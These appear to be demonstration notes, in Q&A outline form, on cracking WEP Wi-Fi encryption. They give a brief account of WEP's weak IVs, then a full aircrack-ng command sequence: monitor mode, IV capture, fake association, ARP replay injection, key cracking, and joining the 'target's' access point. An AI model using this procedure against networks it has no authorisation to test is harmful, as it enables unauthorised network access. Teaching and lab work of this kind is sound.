hacking tools.

Wireless Hacking: Cracking WEP
--------------------------------------------------------------------------------


+ **I've heard you say that WEP is an insecure protocol. Why is that?**
  - The IV used is weak
    + 24-bit (too short)
    + Sent in clear-text
    + RC4 algorithm creates cryptographically weak IVs, susceptible to cracking  
+ **I notice that you have a wireless Access point under the podium. Are we in
  for a demonstration?**
  - `airmon-ng start wlan0`
  - Kill all processes suggested by airmon-ng
  - `airodump-ng wlan0mon`
    + **Can you explain what it is we're looking at here?**
    + Find desired network name
    + Copy BSSID
  - Open new terminal
    + Create capture file containing IVs
      - `airodump-ng -c 6 -w capture_file --bssid XX:XX:XX:XX:XX:XX wlan0mon`
  - Open new terminal
    + Attempt to associate attacker wireless card with target AP
      - `aireplay-ng -1 0 -a XX:XX:XX:XX:XX:XX wlan0mon`
        + Should get "Association successful :-) "
    + Perform ARP replay attack to increase the amount network traffic
      - `aireplay-ng -3 -b XX:XX:XX:XX:XX:XX wlan0mon`
        + Helps to increase the IVs generated by the AP
          - We need a few thousand (15k - 50k)
+ **So once we have enough IVs, we can then attempt to crack the WEP Key?**
  - Open a new terminal
    + Time to crack the WEP key
      - `aircrack-ng capture_file-01.cap`
        + KEY FOUND! [ F2:C7:BB:35:B9 ]
        + Or capture more IVs and try again
          - Crack `belkinWEP-04.cap`
+ **Now that we have cracked the WEP Key, how do we use that to connect to the
  target's Access Point?**
  - Stop monitoring on wlan0mon
    + `airmon-ng stop wlan0mon`
  - Close all open terminals
  - Restart the *Network Manager*
    + `service network-manager start`
  - Use the GUI to attempt to connect with the target's AP
  - Type in the WEP Key (without colons)
  - You should be connected :)
